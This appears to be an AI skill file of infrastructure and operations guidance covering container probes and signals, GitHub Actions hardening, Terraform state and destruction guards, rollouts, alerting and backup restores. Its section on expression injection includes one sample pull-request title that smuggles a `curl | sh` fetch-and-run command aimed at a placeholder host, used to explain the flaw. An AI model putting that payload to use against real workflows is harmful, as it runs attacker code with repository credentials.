---
name: infrastructure-ops
description: Dockerfiles, Kubernetes, GitHub Actions, Terraform, deploys, rollbacks, alerting and backups. Load it before writing or reviewing any CI workflow, container image, manifest, probe, Terraform change, rollout or alert, even a few lines of YAML, because the failures it lists look harmless in review.
license: MIT
metadata:
  author: Alex Tsanis
---

# Infrastructure and operations

Infrastructure bugs rarely show up in review or staging. They show up during the one database blip, fork pull request, rename or rollback that exercises them, and then they hit every instance at once. Treat the pipeline as production (it holds production credentials), read every plan as a list of things that may be destroyed, and assume every rollout runs old and new versions side by side and may have to be reversed halfway.

## Before you judge or change anything

- How the process starts and stops: Dockerfile `CMD`/`ENTRYPOINT` form, wrapper scripts, what sends signals, `terminationGracePeriodSeconds`.
- For a workflow: every trigger under `on:`, whether the repository is public, which jobs reference an `environment`, what secrets and token permissions each job gets, and which ref it checks out and executes.
- For Terraform: the version, the backend and who can read it, how apply runs (CI applying a saved plan, CI re-planning, or a laptop), and which resources hold data.
- For a deploy: how many versions run at once during rollout, where migrations run, and what rollback concretely is (which command, which artifact).
- For a claimed issue: the reachable path. A `pull_request_target` workflow that never checks out or evaluates PR content is not a pwn request; `${{ github.sha }}` in a script is not injectable. Drop findings that a trigger, setting or later guard already blocks.

## Failure catalogue

### Containers and runtime

**Liveness probe that checks dependencies.** `/health` pings the database, Redis or an upstream API and serves as the `livenessProbe`. The dependency blips, every pod fails liveness together, the kubelet restarts all of them, and the restarting fleet plus a reconnect storm keeps the dependency down. The Kubernetes docs warn that wrong liveness probes cause cascading failures. Liveness answers only "is this process wedged" (the event loop responds, the worker loop made progress recently). Dependency checks belong in readiness, and only when pulling this pod out of rotation helps: if every pod shares the dependency, all go unready and clients get connection errors instead of fast 503s. Slow boots get a `startupProbe`, not a long `initialDelaySeconds`. Pointing liveness at a readiness endpoint that checks dependencies is the same bug.

**Signals that never reach the app.** Shell-form `CMD npm start` or `CMD node server.js` runs the app under `/bin/sh -c`, which does not pass signals, so the app is not PID 1 and does not receive SIGTERM (Docker's reference spells this out for shell-form `ENTRYPOINT`; shell-form `CMD` uses the same wrapper, and while some shells exec a lone command, do not rely on it). Every stop waits out the grace period and ends in SIGKILL mid-request. A wrapper script that runs the app without `exec` does the same. A process running as PID 1 gets no default signal actions, so without its own SIGTERM handler it ignores SIGTERM. Fix: exec form (`CMD ["node", "dist/server.js"]`), `exec "$@"` or `exec node ...` as the last line of any wrapper, the runtime started directly instead of through a package manager, a SIGTERM handler that drains, and an init such as `tini` (or `docker run --init`) when the app spawns children that must be reaped.

**Shutdown that drops in-flight work.** The SIGTERM handler calls `process.exit()` or closes the listener at once. Endpoint removal reaches proxies and load balancers after SIGTERM, so new requests keep arriving for a few seconds. Order: readiness false, keep serving through a short drain delay (or a `preStop` wait), close the listener and wait for in-flight requests, stop workers, close pools, all inside `terminationGracePeriodSeconds` (default 30, and `preStop` time counts against it). The Node implementation is in the backend-architecture skill, in its api-and-lifecycle reference.

**Mutable image references.** `FROM node:latest`, `FROM python:3`, `image: api:latest`, `image: api:main`. The build changes without a commit, two nodes run different code under one tag, and "roll back to the previous version" points at nothing. Pin base images as `name:tag@sha256:digest` and let an update bot propose bumps. Deploy by digest or by a tag derived from the commit SHA, in a registry with tag immutability on. The same applies to `curl | sh` installers and `ADD <url>` without `--checksum`.

**Secrets baked into images.** `ARG NPM_TOKEN` written to `.npmrc` and deleted in a later `RUN`; `COPY . .` with a `.env` in the context; `ENV API_KEY=...`. Build args show in `docker history` and in max-mode provenance attestations, and a file deleted in a later layer is still in the earlier one, readable by anyone who can pull the image. Fix: `RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci`, a `.dockerignore` that excludes `.env*`, `.git`, keys and local state, and runtime secrets from the orchestrator. A secret that reached a pushed layer is compromised: rotate it, then rebuild.

**Root containers.** No `USER`, so the app runs as UID 0 and a code-execution bug can rewrite the filesystem and start any escape attempt from root. A named `USER app` combined with Kubernetes `runAsNonRoot: true` fails differently: the kubelet cannot verify a non-numeric user and refuses to start the container. Fix: a numeric `USER`, and a pod `securityContext` with `runAsNonRoot`, `allowPrivilegeEscalation: false`, `readOnlyRootFilesystem: true` (an `emptyDir` for paths that need writes), `capabilities.drop: ["ALL"]` and `seccompProfile.type: RuntimeDefault`.

**CPU limits that throttle.** Linux enforces a CPU limit as a CFS quota per scheduling period. A multi-threaded process (GC threads, a Go scheduler, a thread pool) can spend the quota early in the period and sit throttled for the rest, which shows up as p99 latency spikes while average CPU sits well under the limit. Check `container_cpu_cfs_throttled_periods_total / container_cpu_cfs_periods_total` before blaming the code. Go 1.25+ derives `GOMAXPROCS` from the cgroup CPU limit (not from requests); older Go versions use every node CPU and throttle harder. Memory is the opposite: over the limit the container is OOM-killed, so always set a memory limit and size heaps below it.

### CI/CD pipelines

**Long-lived cloud keys in CI.** `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` as repository secrets with a broad policy. Every workflow, every action those workflows run, and anyone who can push a workflow file can use them, and they never expire. Fix: OIDC federation (`permissions: id-token: write`, `aws-actions/configure-aws-credentials` with `role-to-assume`) and a trust policy that pins `aud` and an exact `sub`, for example `repo:org/repo:environment:production`. A `sub` of `repo:org/repo:*` lets a workflow on any branch, including an unreviewed pull request branch, assume the production role. Separate roles for plan (read-only) and apply.

**Privileged triggers running PR code (pwn request).** `on: pull_request_target`, or `workflow_run` after a PR build, then `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` and `npm ci`, `make`, tests, or a local action. These triggers run with repository secrets and a write-capable token. The checked-out code controls install scripts, Makefiles, test config and local actions, so a fork author runs code with your credentials. A privileged run that restores or saves caches shared with PR runs is exposed to cache poisoning. Fix: build and test untrusted code under plain `pull_request` (no secrets, read-only token); if a privileged step must act on the result, do it in a separate `workflow_run` job that downloads the artifact as data, validates it and never executes it. `pull_request_target` is fine for labelling and triage that never touches PR content.

**Unpinned third-party actions.** `uses: some-org/action@v2` or `@main`. Tags and branches move: in March 2025 most version tags of `tj-actions/changed-files` were repointed to a commit that printed runner secrets into workflow logs (CVE-2025-30066), and every workflow on a tag ran it. Fix: full 40-character commit SHA with the version in a comment, bumped by an update bot and reviewed. Take the SHA from the upstream repository's tag, never from a blog post, issue or PR: GitHub resolves commits from any fork in the network, so `owner/action@<sha>` can name a commit that exists only in an attacker's fork (an impostor commit). Pin images in `container:`, `services:` and `docker://` steps by digest too.

**Expression injection in `run:`.** `run: echo "${{ github.event.pull_request.title }}"` or `git checkout ${{ github.head_ref }}`. The expression is pasted into the script text before the shell parses it, so a PR titled `x"; curl -s evil.sh | sh; "` executes. Attacker-controlled: issue and PR titles and bodies, comment and review bodies, `github.head_ref`, `pull_request.head.ref` and `head.label`, commit messages, author names and emails. The same applies to `actions/github-script` `script:` bodies. Fix: pass the value through `env:` and use it as a quoted shell variable (`"$PR_TITLE"`). Writing attacker text into `$GITHUB_ENV` or `$GITHUB_PATH` is the same bug one step later, since it sets environment for every following step.

**Over-broad `GITHUB_TOKEN`.** No `permissions:` block, so the token gets the repository or organization default, which is read-write in many organizations and can change without anyone editing the workflow. A compromised step pushes code, publishes packages or approves pull requests. Fix: `permissions: {}` at workflow level and per-job grants of exactly what the job needs (`contents: read`, `id-token: write`, `packages: write`); listing any permission sets every unlisted one to `none`. `actions/checkout` persists the token for later git commands by default; set `persist-credentials: false` unless a later step pushes. Pass named secrets to reusable workflows instead of `secrets: inherit`.

**Deploy credentials reachable from any job.** Production secrets stored at repository level and used by a job with no `environment:`, so a workflow on any branch can read them. Fix: attach deploy secrets, or the OIDC `sub` condition, to a GitHub environment with required reviewers, self-review prevented and deployment branches limited to the release branch; environment secrets are released only after approval. Self-hosted runners on a public repository run any contributor's PR on your machine; GitHub's guidance is to almost never do it.

**Rebuilding per environment.** Separate image builds for staging and production, or `npm install` during deploy. What was tested is not what ships. Build once, push, promote the digest; environment differences come from runtime configuration.

**Racing or cancelled deploys.** Two merges start two deploy runs that interleave, or `cancel-in-progress: true` on a deploy or `terraform apply` job kills it halfway, leaving a half-rolled release, a partially applied plan and a held state lock. Fix: `concurrency: { group: deploy-production, cancel-in-progress: false }` on deploy and apply jobs; cancel-in-progress belongs on PR test runs.

### Terraform

**State readable by too many people.** State and saved plan files hold every attribute in cleartext, including generated passwords, private keys and connection strings. `sensitive = true` only redacts CLI output. A state bucket readable by every developer or every CI role is an unaudited secret store. Fix: remote backend with encryption, bucket versioning and locking (`use_lockfile = true` on S3; DynamoDB locking is deprecated), read access limited to the roles that plan and apply that stack, and secrets kept out of state: provider-managed secrets (`manage_master_user_password = true` on RDS), ephemeral values (1.10+), write-only `_wo` arguments (1.11+). Plan files uploaded as CI artifacts are secrets too.

**Rename that destroys data.** Renaming `aws_db_instance.main`, moving it into a module, or switching `count` to `for_each` changes its address. Without a `moved` block the plan destroys the old object and creates an empty one, and "1 to add, 1 to destroy" looks like refactoring noise. Arguments the provider cannot update in place do the same (`must be replaced`, `# forces replacement`). Fix: `moved { from = ... to = ... }`, kept forever in shared modules because removing one makes callers on the old address plan a delete; read every plan for `destroy` and `replace`; fail CI when a plan deletes a protected type (`references/terraform.md`). To stop managing a resource without deleting it, use a `removed` block with `lifecycle { destroy = false }`.

**No destruction guard on data.** Databases, buckets, KMS keys and DNS zones with no `prevent_destroy` and no provider-side protection. `prevent_destroy` only blocks plans while the resource block exists: delete the block and the protection goes with it. Pair it with the provider's guard (`deletion_protection = true` on `aws_db_instance`, default false) and a final snapshot (`skip_final_snapshot` left false). `delete_automated_backups` on `aws_db_instance` defaults to true, so deleting the instance also deletes its automated backups.

**Console drift.** Someone opens a port or resizes a database in the console during an incident. The next apply silently reverts it, or the code stays wrong about production. Adding `ignore_changes` to quiet the diff hides it for good. Fix: scheduled `terraform plan -detailed-exitcode` per stack (exit code 2 means changes) that alerts; incident changes backported into code the same day; `ignore_changes` only for attributes another system owns, such as an autoscaled `desired_count`, with a comment naming the owner.

**Applying a plan nobody reviewed.** The PR shows a plan; after merge CI runs `terraform apply -auto-approve`, which plans again against state that has since changed. Fix: `plan -out`, review that plan, apply that file; or require environment approval of the fresh plan. Commit `.terraform.lock.hcl` and pin module versions so a new provider release cannot change the plan between review and apply.

**One state and one credential for everything.** Staging and production in one state, or applied by one admin role. A typo or `-target` meant for staging reaches production, and one lock blocks every team. Split state per environment and per blast radius (network, data, application), each with its own apply role.

### Deploys and releases

**Migrations run by every replica at startup.** The entrypoint runs `migrate deploy && exec node ...`, or an `initContainer` does. Replicas race; tools that take a lock serialize them, but the rollout stalls behind the migration, a probe kills a pod mid-migration, and some tools leave their lock held after a kill (Liquibase's `DATABASECHANGELOGLOCK` then needs `release-locks`) so every new pod hangs. A failing migration puts the whole Deployment in CrashLoopBackOff. Fix: run migrations once per release as a pipeline step or Kubernetes Job before the rollout, with its own timeout and `lock_timeout`, and gate the rollout on its success. Lock-safe DDL is in database-engineering.

**Deploys incompatible with the running version.** A rolling update runs old and new pods together for minutes, and a rollback does it again in reverse. What breaks: a column renamed or dropped while old code reads it; a new required field in a queue message that old consumers reject; a changed session, cookie or cache format that old pods cannot parse; an API field removed while installed mobile clients still depend on it. Fix: expand, migrate, contract across releases (readers accept the new shape first, writers produce it later, removal last). For every change, ask whether version N-1 works against state that version N wrote.

**No rollback path.** Rollback means "revert and wait for CI", the old tag was overwritten, a destructive migration shipped in the same release, or config was changed by hand. Fix: the previous artifact digest is recorded and redeployable with one command; migrations in a release are additive so the previous version still runs; risky behavior sits behind a flag; rollback has been exercised. If a release cannot be rolled back, the release plan says so and names the roll-forward fix.

**Rollout with no brake.** 100% of traffic at once, or a rolling update where readiness passes on pods that return 500 for every real request. Progress through a canary or small percentage, compare error rate and latency with the old version, abort automatically. Readiness has to mean "can serve", not "port is open".

**DNS cutover with a long TTL.** A record with a day-long TTL is switched to a new load balancer and clients keep hitting the old one for a day; some resolvers and runtimes cache longer than the TTL. Lower the TTL at least one old-TTL period before the change, keep the old endpoint serving until its own logs show no traffic, raise the TTL afterwards. The same overlap rule applies to certificates and IP allowlists.

### Observability and recovery

**Paging on causes.** Pages for CPU over 80%, one pod restart, a single 500, disk at 70% on a node. Most fire while users are fine, the team learns to ignore pages, and the real one gets muted. Page on symptoms users feel, against an SLO: error ratio and latency at the edge, job and queue freshness. Multiwindow burn-rate alerts (14.4x budget burn over 1h confirmed over 5m, 6x over 6h confirmed over 30m, both paging; 1x over 3 days as a ticket) catch fast and slow burns without flapping. Causes go on dashboards. Every page has an owner and a runbook, and a page that twice led to no action gets fixed or deleted.

**Silent failures nobody watches.** Failures that look like nothing happening: a TLS certificate expiring (Let's Encrypt stopped sending expiry emails in June 2025), backups that stopped or write empty files, a cron job that no longer runs, a queue with normal depth whose oldest message is two hours old, an operational wallet or prepaid account (gas wallet, SMS credits, payout float) draining toward zero. Alert on time since last success, on `absent()` of the heartbeat so a job that never reports still pages, on oldest-message age rather than depth, on days to certificate expiry from an external probe, and on balance runway rather than a fixed floor alone.

**Logs that leak secrets and personal data.** Logging whole request objects, `Authorization` and `Cookie` headers, bodies of login and payment endpoints, URLs with tokens in the query string, or error objects that embed connection strings or upstream responses. Logs have wide read access, long retention and third-party processors. Fix: allowlist the fields you log, add logger-level redaction of known paths as a second layer, never log auth request bodies, and rotate anything that was logged.

**Unbounded metric labels.** `user_id`, `email`, raw paths (`/users/8123/orders`), request ids or error text as label values. Every unique label combination is a new time series; memory and cost grow until the metrics backend falls over, usually mid-incident. Labels come from small fixed sets (route template, method, status class); per-entity detail goes to logs and traces.

**Backups never restored.** A backup job green for a year into a bucket nobody has restored from. When someone finally tries: missing WAL or binlog so point-in-time recovery fails, the encryption key is gone, a schema was excluded, or the restore takes nine hours against a one-hour objective. Backups in the production account die with a compromised account or a `terraform destroy`. Fix: a scheduled automated restore into scratch infrastructure with data checks, alerting on failure; copies in a separate account with write-once or deletion restrictions; restore time measured against the recovery time objective.

## Decision rules

Probes: liveness checks only the process itself; readiness adds what this pod needs to serve and flips false at shutdown start; startup covers slow boots. No liveness probe at all is better than one that checks a dependency.

CPU: always set requests from measured usage. For latency-sensitive services leave the CPU limit off or well above the request, unless platform policy requires one; then watch the throttling ratio. Always set a memory limit.

Migrations: once per release, before the rollout, as a separate step whose failure stops the deploy. Never in the app's startup path, never in an `initContainer`.

Workflow triggers: `pull_request` for anything that runs PR code. `pull_request_target` only for jobs that never check out or evaluate PR content. `workflow_run` to act on an untrusted artifact as data.

CI credentials: OIDC whenever the provider supports it, with `sub` pinned to an environment or protected branch. A stored secret only where no federation exists, scoped to an environment, with an owner and a rotation date.

Rollback or roll forward: roll back when the previous artifact is still compatible with current state (the default, if expand-contract was followed). Roll forward only when rollback is known to be unsafe, and decide that before the release, not during the incident.

Terraform state boundaries: separate state when resources differ in environment, owner, change frequency or blast radius. Data stores never share state with application resources that change daily.

## Review checklist

- Does the liveness probe avoid every network dependency, and is there a startup probe for slow boots?
- Does SIGTERM reach the app (exec form, `exec` in wrappers), and does the drain finish inside the grace period?
- Is every base image, deployed image, third-party action and CI container pinned by digest or full SHA, with the SHA taken from the upstream tag?
- Is there no secret in `ARG`, `ENV`, copied files or any image layer?
- Does the container run as a numeric non-root UID with a restrictive `securityContext`?
- Does every job that runs PR code run without secrets and with a read-only token?
- Does every `${{ }}` inside `run:` or `script:` expand only trusted values?
- Does each workflow set `permissions:` explicitly, and do jobs get only what they use?
- Does CI reach the cloud through OIDC with an exact `sub` condition, and are production credentials behind a protected environment?
- Are deploy and apply jobs serialized with `cancel-in-progress: false`?
- Does the plan contain no unexpected destroy or replace, and does every address change have a `moved` block?
- Do data resources have `prevent_destroy` plus provider deletion protection, final snapshots, and backups that survive instance deletion?
- Is state encrypted, locked, versioned and readable only by the roles that apply it, with secrets kept out of it where the provider allows?
- Is the applied plan the reviewed plan?
- Do migrations run once, before rollout, and can version N-1 run against the new schema and message formats?
- Is rollback one command to a recorded artifact, and has it been exercised?
- Do pages fire on user-facing symptoms with a runbook, and do heartbeats cover backups, cron jobs, certificates, queue age and balances?
- Are logs free of tokens, cookies and personal data, and are metric labels bounded?
- Has a restore from backup run recently and been timed?

## References

- `references/containers-and-kubernetes.md`: read when writing or reviewing a Dockerfile, entrypoint, Deployment, probes, resources, securityContext or a migration Job.
- `references/github-actions.md`: read when writing or reviewing any workflow, OIDC trust policy, or auditing a repository's workflows.
- `references/terraform.md`: read before a Terraform refactor, a change to a stateful resource, backend setup, or wiring plan and apply into CI.
- `references/deploys-and-observability.md`: read when planning a release, rollback, DNS or certificate cutover, or writing alert rules, heartbeats, log redaction or a restore drill.

Related skills: security-engineering for secret lifecycle, Kubernetes RBAC and network policy; backend-architecture for graceful shutdown code, idempotent jobs and reconciliation; database-engineering for lock-safe migrations and expand-contract schema steps.
